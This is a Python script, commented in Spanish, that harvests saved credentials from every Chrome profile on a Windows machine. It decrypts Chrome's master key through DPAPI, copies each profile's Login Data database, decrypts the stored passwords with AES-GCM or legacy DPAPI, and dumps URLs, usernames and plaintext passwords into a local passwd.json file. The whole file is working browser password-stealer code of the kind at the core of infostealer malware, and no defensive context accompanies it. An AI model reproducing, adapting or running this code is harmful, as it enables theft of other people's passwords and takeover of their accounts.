import os
import json
import base64
import win32crypt
from Cryptodome.Cipher import AES
import sqlite3
import shutil

def get_encryption_key():
    local_state_path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Local State"
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(encrypted_password, key):
    try:
        nonce, ciphertext, tag = encrypted_password[:12], encrypted_password[12:-16], encrypted_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")
    except Exception as e:
        return f"Failed to decrypt: {e}"

passwd_list = {}

def get_chrome_passwords():
    base_path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data"
    profiles = ["default"]  # Incluir "default"
    
    # Agregar perfiles adicionales como Profile 1, Profile 2, etc.
    profile_dirs = [dir_name for dir_name in os.listdir(base_path) if dir_name.startswith("Profile")]
    profiles.extend(profile_dirs)

    key = get_encryption_key()

    # Recorrer todos los perfiles encontrados
    for profile in profiles:
        original_db_path = os.path.join(base_path, profile, "Login Data")
        
        # Verificar si existe el archivo Login Data
        if os.path.exists(original_db_path):
            temp_db_path = os.getenv("LOCALAPPDATA") + r"\Temp\Login Data"
            shutil.copyfile(original_db_path, temp_db_path)

            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for url, username, encrypted_password in cursor.fetchall():
                if encrypted_password.startswith(b'v10'):  # Nuevo esquema de cifrado
                    decrypted_password = decrypt_password(encrypted_password[3:], key)
                else:  # Antiguo esquema (DPAPI)
                    if encrypted_password:
                        try:
                            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                        except Exception as e:
                            decrypted_password = f"Failed to decrypt (DPAPI): {e}"
                    else:
                        decrypted_password = "No encrypted password"
                
                # Revisar si la URL ya existe en passwd_list
                if url in passwd_list:
                    # Si la URL ya existe, aseguramos que no se sobrescriba y agregamos el perfil
                    if profile not in passwd_list[url]:
                        passwd_list[url][profile] = {"Username": username, "Password": decrypted_password}
                else:
                    # Si la URL no existe, agregarla
                    passwd_list[url] = {profile: {"Username": username, "Password": decrypted_password}}
            conn.close()
            os.remove(temp_db_path)
        else:
            print(f"Login Data no encontrado en {original_db_path}")

    file_name = "passwd.json"
        
    with open (file_name, "w", encoding="utf-8") as file:
        json.dump(passwd_list, file, indent= 4, ensure_ascii=False)
    return file_name
